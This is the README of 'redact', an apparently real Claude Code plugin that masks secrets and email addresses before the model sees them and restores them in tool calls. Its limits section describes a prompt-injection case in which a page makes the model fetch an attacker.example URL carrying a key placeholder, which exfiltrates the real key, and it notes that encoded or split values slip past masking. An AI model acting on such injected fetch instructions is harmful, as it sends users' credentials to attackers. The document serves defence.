# redact

Swaps secret-shaped values and email addresses for numbered placeholders before the model sees them, from the first request on, and puts the real values back where they run. It matches private keys (cut-short ones too), vendor tokens (`sk-`, `ghp_`, `AKIA`, `xoxb-`, JWTs and more), a token-shaped value after `Bearer`, passwords in URLs, the value after `--password` or `--token`, values assigned to a name with token, secret, password or key in it, email addresses (not a git host's `git@`), and your own patterns. Of personal data it masks emails only; add patterns for more. It is a pattern list, not a guarantee.

**Protects against**

- A secret or email address in your prompt, a file, a command's output, CLAUDE.md, a skill or a subagent's work reaching the model, and with it the provider.
- A failure in redact itself sending a value: what it can't mask is withheld (fails closed).

**Does not protect against**

- Real values leaving through a tool. Every tool gets them, WebFetch, WebSearch and MCP tools included, so a prompt injection or a placeholder echoed into a command sends the value out. See [What gets the real values](#what-gets-the-real-values).
- Model requests made after the restore: the permission check (in auto mode its classifier is a model), WebSearch's query, WebFetch's prompt to the model that reads the page.
- Values no rule matches: an unusual format, an encoded or split value, one sent before a rule matched it.
- Images and documents, personal data other than emails, and other hooks, plugins or telemetry that see tool input.
- Someone set on turning it off: its guard on its own config is best effort. [HARDENING.md](HARDENING.md) closes more of it.

## Why

Secrets reach the model's context by many paths: a `cat .env`, an `env` dump, a `git diff`, a log line, an error message, your CLAUDE.md. Once there, they go to the model provider with every request, yet Claude often needs the value to run a command. redact is for anyone running Claude Code on a machine that holds real credentials.

Deny rules (`Read(.env)`) close one path, leave an `env` dump, a `git diff` and a log line open, and keep Claude from working with the file at all. gitleaks and other secret scanners check files and commits; they don't sit between a tool's output and the model. A DLP gateway masks requests on the wire, but needs a TLS-intercepting proxy, and the tool calls the model sends back hold placeholders your local tools can't run. redact runs inside Claude Code, where it sees both the request and the tool call, so it masks one and restores the other.

## Install

```
/plugin install redact --marketplace dboeter/cc-plugins
```

Answer `y` to add the marketplace, then pick a scope.

## How it works

- **Masked before the model sees it**: your prompt and a slash command's arguments, the first request's context (CLAUDE.md, your account's email, the date), the system prompt, the reminders and mentioned files Claude Code injects, a skill's text, an MCP tool's description, and every row the conversation keeps: tool results, a subagent's rows too. The model reads `GITHUB_TOKEN=⟦API_KEY_n⟧`.
- **Numbered**: each rule names a content type (`PRIVATE_KEY`, `API_KEY`, `TOKEN`, `PASSWORD`, `SECRET`, `EMAIL`), which labels its placeholders unless the rule names a label of its own. Distinct values get distinct numbers. A value keeps its placeholder for the whole session, its subagents, retries and a `--resume`, and once matched, a value is masked wherever it comes back as a whole word, even where no rule would match it: `hunter2` and a PIN too. The price: a word or number a rule misread stays masked for the rest of the session. A rule that guesses from context alone (a token after `Bearer`) masks only a value of 8 or more characters of at least two kinds out of letters, digits and symbols. A rule that goes by a name or a place (a password in a URL, the value after `--password` or assigned to a secret's name) masks only a value of 4 or more characters, leaves one of lowercase letters alone (`password: value`, `--token word`: a doc or usage line puts a word there more often than a setting puts a password), and leaves `name: value` followed by more words on the line, as that reads as prose (`TOKEN: a token-shaped value`), not a setting. A value with no letter or digit (`**`, `...`) is never masked. Patterns run only on the text between placeholders, so `\d+` never rewrites one's number.
- **Restored where it runs**: every tool call gets the real values back in its input before it runs, so a Write, an Edit or a Bash command works on the real value. The terminal draws the real values in the transcript, so the status line under the prompt counts what is masked (`redact: 4 masked`), and the pane can switch the terminal to draw the placeholders, as the model reads them.
- **Kept local**: the values and their placeholders sit in a vault per session in the plugin's store, never in a request.

## What gets the real values

Every tool, remote ones included: WebFetch, WebSearch, MCP tools. The restore is silent on purpose: redact keeps secrets out of the model, not out of your tools, so a command that needs a key gets it without a prompt. That has a price:

- **A placeholder in an outgoing call sends the real value.** One the model echoes into `gh pr create --body`, a commit message or a WebSearch query goes out as the value itself. To send the placeholder text instead, escape it (`⟦!API_KEY_n⟧`, see [What it refuses](#what-it-refuses)).
- **A prompt injection can send a value out.** A page or file that tells the model to fetch `https://attacker.example/?k=⟦API_KEY_n⟧` gets the real key sent there. The placeholder keeps a value from the model, not from the services the model calls.
- **The permission check sees the real values**, as it runs after the restore. In auto mode its classifier is a model request.
- **A tool's own model request**, where it makes one (WebSearch's query, WebFetch's prompt to the model that reads the page), carries the real value.

## Use

No `/redact` command enters the conversation: its line is dropped and its reply is a toast, so the model reads neither. `/redact` (or `/redact show`) opens a tabbed pane on **This session**; `/redact patterns` (or `/redact test [text]`) opens it on **Patterns**, and `/redact guide` (or `help`) on **Guide**. The top bar switches tabs (`s`, `p`, `h`), flags any skipped patterns, and on the terminal shows what the terminal draws (`the real values` or `as the model reads it`) with a switch (`d`).

- **This session** lists each placeholder the vault holds, with its value (the length alone off the terminal), the pattern that masked it, and a red ✗ that forgets it; with more than one, a red ✗ all drops them all. A value with a line break or over 40 characters (a private key) shows its first 6 and last 4 characters and its size until you press its ▸ (▾ hides it again). The model never reads the pane, and text read back off the screen (`tmux capture-pane` in a Bash call) comes back masked, as the vault holds every value the pane shows; a screenshot does not, as images are not masked. Forgetting drops the value from the vault: a tool call naming that placeholder is refused from then on, and the value, matched again, masks under a new number, never the old one.
- **Patterns** starts with a **Test** section that previews on Enter (or via `/redact test <text>`) what your active patterns mask in sample text without saving to the vault. Below it, **Built-in** lists the rules redact ships with, each by its name, id and label, with a switch that turns it off or on; **Yours** has an `add` field at the top followed by the patterns in your file, each by its name (or the line itself), the label it masks under and a red ✗ that removes it; then **From settings** (where a pattern that does not read is marked skipped and named in the status line). On the mobile app, with no field, test and add from the prompt.
- **Guide** summarizes the pattern format, placeholder escaping, and where real values go.

`/redact test <text>`, `/redact add <pattern>`, `/redact remove <n|pattern>`, `/redact off <rule>` and `/redact on <rule>` work from the prompt, answered in a toast; remove takes a pattern's number or the line itself, and a number that names a pattern is read as its number. Should a `/redact` line reach the conversation all the same, its arguments are emptied in every row the model is sent.

Your patterns live in `~/.claude/redact-patterns.txt` (in `$CLAUDE_CONFIG_DIR` when that is set), one for every project. redact creates it on first use holding a short header that explains the format, and nothing else: the built-in rules stay in redact, so a fix to one reaches you with an update. Edit the file by hand, or with `/redact add`, `remove`, `off` and `on`, which keep your comments. It is read again before every masking, so an edit masks from the next message on, in every open session. Each line is trimmed; blank lines and lines starting with `#` are skipped, and the first line of the comment right above a pattern names it in the pane. A line is one of:

```
# masks each match as ACME_KEY_n
ACME_KEY: (?<=ACME_KEY=)\S+
# options go between the label and the colon
EMPLOYEE_ID min=6 i: \be\d{6}\b
# a bare regex masks as SECRET
\bproj-[0-9a-f]{12}\b
# turns a built-in rule off
off email
```

The regex is the rest of the line after the first `: `, as written; a label is capital letters, digits and `_`. Each match is masked whole; a lookbehind keeps a prefix, and so does a group named `v` (or `v2`), which is all that is masked when it matched: `(?<pre>ACME_KEY=)(?<v>\S+)`. The options:

- `i`: match whatever the case.
- `min=N`: mask only a match of N characters or more, and not one of lowercase letters only.
- `strong`: mask only a match of 8 or more characters of at least two kinds out of letters, digits and symbols.
- `prose`: leave an unquoted match right after a colon alone when words follow it on the line.

The built-in rules and their ids: `private-key`, `vendor-token`, `bearer`, `url-password`, `flag` (the value after `--password` and the like), `assigned` (a value assigned to a secret's name) and `email`. To change one, turn it off and add your own version; the pane names what each hides and leaves alone. They run first, in that order, then your patterns in file order, so none of yours can split a value a rule masks whole. A line that does not read (an unknown option or rule, a regex that does not compile) is skipped and marked in the pane. Should the file not read, masking goes on with every built-in rule.

A file an older version wrote, with the built-in rules in it, is rewritten once in this format: a rule it holds unchanged goes, one you deleted or edited becomes an `off` line (your edited copy stays, as your pattern), and each pattern's options move from after ` #!` to before it. Patterns an older version kept in its store move into the file on first use.

More can be set in the `patterns` option, in the same format (an `off` line there turns nothing off), run after the file's; it is a list, so set it in settings.json (`/config` does not show list fields):

```json
"pluginConfigs": { "redact@dboeter": { "options": { "patterns": ["ACME_KEY: (?<=ACME_KEY=)\\S+"] } } }
```

## What it refuses

- **A placeholder it cannot restore**: a tool call naming a placeholder this session's vault does not hold (a number the model made up, one from another session, or a vault pruned or lost) is refused, rather than run with the placeholder in place of the value, and a toast tells you why. To write a placeholder as literal text (a doc, a PR body, a report about redact), put `!` after its opening bracket: `⟦!API_KEY_n⟧` with a real number is written as the placeholder itself, never looked up. In a README, write placeholders with a letter for the number (`⟦API_KEY_n⟧`), as this one does, or without the brackets.
- **Its own config** (off by default while redact is in development; the undeclared `guard: true` option turns it on): any call that reads or changes your patterns file, a call that would change its store (the vaults), or its `enabledPlugins` and `pluginConfigs` entries in a settings file. A file tool is matched on where its path lands, so a link or another casing is caught, and a Grep over a folder that holds the patterns file (`~/.claude`, your home folder) is refused. A Write or Edit of a settings file is compared before and after, so an edit that names only `"patterns"` is caught. Bash is matched as text: a command naming the patterns file, a glob at the top of a `.claude` folder (`cat ~/.claude/*`), a recursive reader or copier (`grep -r`, `rg`, `find`, `tar`, `cp`) naming that folder, the store, or a `claude/settings*.json` path and `redact`. A bare `ls ~/.claude` passes. Reading the store through Bash is refused too; the pane lists your patterns.
- **Its own failure**: when masking throws or outruns the hook's budget, what it masks is withheld: a row's text is replaced with a notice, a prompt is not sent, a command does not run, an injected reminder, a skill's text or an MCP tool's description is left out, the first request's context blocks are dropped, and the system prompt keeps only the sections that read the same for everyone. A toast tells you when context, system prompt sections or a reminder were left out. Nothing goes out unmasked.

## Limits

- **Shapes**: masking matches what a secret looks like, so an encoded or split value (`base64`, `rev`) gets through, and so does a password under 4 characters, one of lowercase letters only, quoted or not, after a secret's name, `--password`, `--token` and the like, or in a URL (`password=letmein`), or a `password: value` with more words after it on the line. A value first sent before any rule matched it stays in the rows that already carry it.
- **Images and documents**: Claude Code lets a plugin drop or move them, not change them, so a screenshot of a secret goes out as it is.
- **Other code that sees the real values**: settings hooks (PreToolUse and PostToolUse get a tool's input and output), other plugins' hooks and model calls, and telemetry that logs tool input.
- **Managed setups**: where an organization manages Claude Code, the hooks on skills' text, the first request's context, the system prompt and injected reminders run only for a plugin the organization lists in managed settings.
- **Where placeholders show**: every surface but the terminal keeps them (the mobile app over Remote Control, the desktop app, VS Code), so drawing never sends a value off the terminal, and the pane's draw switch is on the terminal only; so do collapsed tool groups, the prompt history, and the terminal while the pane's toggle draws it as the model reads it.
- **Context shifts**: a value is put back as it was captured. One taken from a JSON string, escapes and all, and written into a file of another format is written as captured.
- **Placeholder-shaped text**: text of a placeholder's shape that a file already holds reads as one when the vault holds its number, and is restored to that value on write. One the vault does not hold reads escaped, so writing it back gives the literal text. A file that already holds the escaped form loses its `!` on write.

## Harden it

Permission rules and a managed-settings entry hold where the plugin's own guard can't: see [HARDENING.md](HARDENING.md).

## What it does on your machine

- **Storage**: your patterns in `~/.claude/redact-patterns.txt`; in the plugin's store, `~/.claude/plugins/store/redact_*.json`, a vault per session, holding that session's real values in plain text. A vault untouched for 30 days is dropped when a session starts; a `--resume` of that session then refuses its placeholders.
- **Files**: it reads a settings file that a Write or Edit is about to change, to compare its own entries before and after. It writes nothing but its store and your patterns file. The transcript file keeps a tool's own record (what the terminal draws, a Read's file content say) as the tool made it; what the model is sent is masked.
- **Network**: nothing.
